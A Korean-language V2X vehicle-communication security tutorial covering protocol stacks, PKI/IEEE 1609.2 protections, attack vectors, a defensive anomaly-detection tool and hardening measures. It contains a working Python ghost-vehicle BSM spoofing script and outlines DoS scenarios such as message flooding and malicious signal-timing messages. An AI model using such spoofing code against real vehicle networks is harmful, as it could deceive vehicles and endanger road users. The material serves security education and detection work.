# V2X 보안 (Vehicle-to-Everything)

## V2X 개요

```
V2X 통신 유형
├── V2V (Vehicle-to-Vehicle) — 차량 간 직접 통신
├── V2I (Vehicle-to-Infrastructure) — 신호등, 도로 시스템
├── V2P (Vehicle-to-Pedestrian) — 보행자 스마트폰
├── V2N (Vehicle-to-Network) — 클라우드/인터넷
└── V2G (Vehicle-to-Grid) — 전력망 (전기차)
```

## V2X 기술 스택

### DSRC (Dedicated Short-Range Communications)
```
IEEE 802.11p (WAVE)
├── 5.9 GHz 대역 (5.85~5.925 GHz)
├── 범위: ~1km
├── 대기 시간: <5ms
└── 단방향 브로드캐스트 중심

프로토콜 스택
├── WSMP (Wave Short Message Protocol)
├── IPv6
├── TCP/UDP
└── 보안: IEEE 1609.2
```

### C-V2X (Cellular V2X)
```
3GPP Rel-14 이후 지원
├── PC5 인터페이스 — 직접 통신 (D2D)
├── Uu 인터페이스 — 네트워크 통해 통신
├── 5G NR-V2X (Rel-16) — 고신뢰 저지연
└── 범위: 동일 대역 DSRC보다 우수

지원 서비스
├── 기본 안전 메시지 (BSM)
├── 신호 위상 및 타이밍 (SPaT)
├── 지도 데이터 (MAP)
└── 도로 비상 경보
```

## V2X 보안 아키텍처

### PKI 기반 인증
```
SCMS (Security Credential Management System)
├── Root CA — 최상위 신뢰 기관
├── Intermediate CA — 지역/제조사 CA
├── PCA (Pseudonym CA) — 익명 인증서 발급
├── RA (Registration Authority) — 등록 기관
└── MA (Misbehavior Authority) — 오동작 탐지

의사명 인증서 (Pseudonym Certificate)
├── 실제 신원 숨기기 (프라이버시 보호)
├── 주기적 교체 (추적 방지)
├── 단기 유효기간 (1주~수개월)
└── 일관성 검증 불가 → 단일 조정점 없음
```

### IEEE 1609.2 메시지 보안
```
SPDU (Secured Protocol Data Unit)
├── 헤더 — 버전, 프로토콜
├── ToBeSignedData
│   ├── 페이로드 (BSM 등)
│   ├── HeaderInfo (만료, 위치, PSID)
│   └── 서명 정보
├── 서명 — ECDSA (P-256 또는 brainpoolP256)
└── 인증서 (또는 해시)
```

## 공격 벡터

### 1. 스푸핑 공격
```python
#!/usr/bin/env python3
"""V2X BSM 스푸핑 시뮬레이터 (연구/테스트 환경 전용)."""

import argparse
import struct
import socket
import time
import random
import math
from dataclasses import dataclass


@dataclass
class BasicSafetyMessage:
    """IEEE 1609.2 BSM 구조 (J2735 표준)."""
    msg_count: int        # 0-127
    temp_id: bytes        # 4바이트 임시 ID
    timestamp: int        # 1/10ms 단위
    latitude: int         # 1/10 마이크로도
    longitude: int        # 1/10 마이크로도
    elevation: int        # 2cm 단위
    speed: int            # 0.02 m/s 단위
    heading: int          # 0.0125도 단위
    accel_long: int       # 가속도
    brakes: int           # 브레이크 상태
    vehicle_size: int     # 폭, 길이


def encode_bsm(bsm: BasicSafetyMessage) -> bytes:
    """BSM을 바이트로 직렬화 (간략화된 ASN.1 인코딩)."""
    return struct.pack(
        ">BIiiiHHbBH",
        bsm.msg_count,
        int.from_bytes(bsm.temp_id, "big"),
        bsm.timestamp,
        bsm.latitude,
        bsm.longitude,
        bsm.elevation,
        bsm.speed,
        bsm.accel_long,
        bsm.brakes,
        bsm.vehicle_size,
    )


def generate_fake_position(
    base_lat: float,
    base_lon: float,
    offset_m: float = 100.0,
) -> tuple[float, float]:
    """가짜 위치 생성 (기준 좌표 + 오프셋)."""
    # 1도 ≈ 111km
    lat_offset = offset_m / 111_000
    lon_offset = offset_m / (111_000 * math.cos(math.radians(base_lat)))
    return (
        base_lat + random.uniform(-lat_offset, lat_offset),
        base_lon + random.uniform(-lon_offset, lon_offset),
    )


def spoof_ghost_vehicle(
    host: str,
    port: int,
    base_lat: float,
    base_lon: float,
    count: int = 10,
    interval: float = 0.1,
) -> None:
    """존재하지 않는 차량 BSM 브로드캐스트 (유령 차량 공격)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"[*] 유령 차량 생성: {count}개, 간격 {interval}s")
    for i in range(count):
        lat, lon = generate_fake_position(base_lat, base_lon, 50.0)
        bsm = BasicSafetyMessage(
            msg_count=i % 128,
            temp_id=random.randbytes(4),
            timestamp=int(time.time() * 1000) % (65535 * 10),
            latitude=int(lat * 1e7),
            longitude=int(lon * 1e7),
            elevation=1000,  # 20m
            speed=int(30 / 0.02),  # 30 km/h
            heading=int(90 / 0.0125),  # 동쪽
            accel_long=0,
            brakes=0,
            vehicle_size=0x0A14,  # 2m × 5m
        )
        payload = encode_bsm(bsm)
        sock.sendto(payload, (host, port))
        print(f"  전송 {i+1}/{count}: ({lat:.6f}, {lon:.6f})")
        time.sleep(interval)

    sock.close()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="V2X BSM 분석 도구 (연구 환경 전용)",
    )
    parser.add_argument("host", help="V2X 테스트 서버 IP")
    parser.add_argument("-p", "--port", type=int, default=9999)
    parser.add_argument("--lat", type=float, default=37.5665,
                        help="기준 위도 (기본: 서울 시청)")
    parser.add_argument("--lon", type=float, default=126.9780,
                        help="기준 경도")
    parser.add_argument("-n", "--count", type=int, default=20)
    parser.add_argument("--interval", type=float, default=0.1)
    args = parser.parse_args()

    print(f"[*] V2X BSM 스푸핑 테스트 (연구 환경 전용)")
    print(f"[*] 기준 위치: ({args.lat}, {args.lon})")
    spoof_ghost_vehicle(
        args.host, args.port,
        args.lat, args.lon,
        args.count, args.interval,
    )


if __name__ == "__main__":
    main()
```

### 2. 리플레이 공격 방어
```
BSM 리플레이 방어 메커니즘
├── 타임스탬프 검증 (최대 허용 지연: 수백 ms)
├── GenerationTime + ExpiryTime 필드
├── 시퀀스 번호 단조 증가 확인
└── 위치-시간 일관성 검증 (물리적 불가능한 이동 탐지)
```

### 3. 서비스 거부 (DoS)
```bash
# V2X DoS 시나리오 (테스트 환경)
# 대량 BSM 플러딩 → ECU 처리 과부하
# 악성 SPaT 메시지 → 신호 오동작
# 채널 혼잡 → 정상 메시지 지연
```

## V2X 보안 분석 도구

```python
#!/usr/bin/env python3
"""V2X 메시지 캡처 및 검증 도구."""

import argparse
import socket
import time
import struct
from dataclasses import dataclass
from collections import defaultdict


@dataclass
class CapturedBSM:
    recv_time: float
    src_ip: str
    raw: bytes
    msg_count: int
    temp_id: str
    latitude: float
    longitude: float
    speed_kmh: float


def decode_bsm(data: bytes, src_ip: str) -> CapturedBSM | None:
    if len(data) < 20:
        return None
    try:
        msg_count, temp_id_int, ts, lat, lon, elev, speed, accel, brakes, size = \
            struct.unpack(">BIiiiHHbBH", data[:26])
        return CapturedBSM(
            recv_time=time.time(),
            src_ip=src_ip,
            raw=data,
            msg_count=msg_count,
            temp_id=f"{temp_id_int:08X}",
            latitude=lat / 1e7,
            longitude=lon / 1e7,
            speed_kmh=speed * 0.02 * 3.6,
        )
    except struct.error:
        return None


def detect_anomalies(messages: list[CapturedBSM]) -> list[str]:
    """V2X 메시지 이상 탐지."""
    anomalies: list[str] = []
    by_id: dict[str, list[CapturedBSM]] = defaultdict(list)
    for msg in messages:
        by_id[msg.temp_id].append(msg)

    for temp_id, msgs in by_id.items():
        msgs.sort(key=lambda m: m.recv_time)
        for i in range(1, len(msgs)):
            prev, curr = msgs[i-1], msgs[i]
            dt = curr.recv_time - prev.recv_time
            if dt < 0.001:
                anomalies.append(
                    f"[리플레이?] {temp_id}: dt={dt:.4f}s (너무 빠름)"
                )
            # 물리적으로 불가능한 이동 거리
            import math
            dlat = abs(curr.latitude - prev.latitude)
            dlon = abs(curr.longitude - prev.longitude)
            dist_m = math.sqrt((dlat * 111000)**2 + (dlon * 111000)**2)
            max_dist = curr.speed_kmh / 3.6 * dt * 2  # 2배 여유
            if dist_m > max(max_dist, 10) and dt < 1.0:
                anomalies.append(
                    f"[스푸핑?] {temp_id}: {dist_m:.0f}m 이동 in {dt:.2f}s "
                    f"(속도 {curr.speed_kmh:.1f}km/h)"
                )

    # 대량 임시 ID → 유령 차량 공격
    unique_ids = len(by_id)
    if unique_ids > 20:
        anomalies.append(f"[DoS?] 비정상적으로 많은 임시 ID: {unique_ids}개")

    return anomalies


def main() -> None:
    parser = argparse.ArgumentParser(description="V2X 메시지 모니터링")
    parser.add_argument("-p", "--port", type=int, default=9999)
    parser.add_argument("-t", "--time", type=float, default=30.0,
                        help="캡처 시간 (초)")
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", args.port))
    sock.settimeout(1.0)
    print(f"[*] V2X 리스닝: UDP:{args.port} ({args.time}초)")

    messages: list[CapturedBSM] = []
    end = time.time() + args.time

    while time.time() < end:
        try:
            data, addr = sock.recvfrom(4096)
            msg = decode_bsm(data, addr[0])
            if msg:
                messages.append(msg)
                print(f"  [{msg.temp_id}] ({msg.latitude:.5f},{msg.longitude:.5f}) "
                      f"{msg.speed_kmh:.1f}km/h")
        except TimeoutError:
            pass

    print(f"\n[+] 캡처: {len(messages)}개 BSM")
    anomalies = detect_anomalies(messages)
    if anomalies:
        print(f"\n[!] 이상 탐지 ({len(anomalies)}개):")
        for a in anomalies:
            print(f"    {a}")
    else:
        print("\n[+] 이상 없음")
    sock.close()


if __name__ == "__main__":
    main()
```

## V2X 보안 강화 방안

```
기술적 대책
├── PKI 기반 의사명 인증서 (프라이버시 + 인증)
├── 오동작 탐지 시스템 (Misbehavior Detection)
├── 지역 동적 지도 (Local Dynamic Map) 일관성 검증
├── 타임스탬프 + GPS 위치 교차 검증
└── 5G NR-V2X URLLC (초신뢰 저지연)

운영 대책
├── SCMS 인증서 실시간 취소 (CRL/OCSP)
├── 지역 CA 침해 시 신속 대응 절차
└── V2X 보안 사고 대응 기관 (ISAC)
```

다음 파일에서 자동차 침투 테스트 방법론을 다룬다.
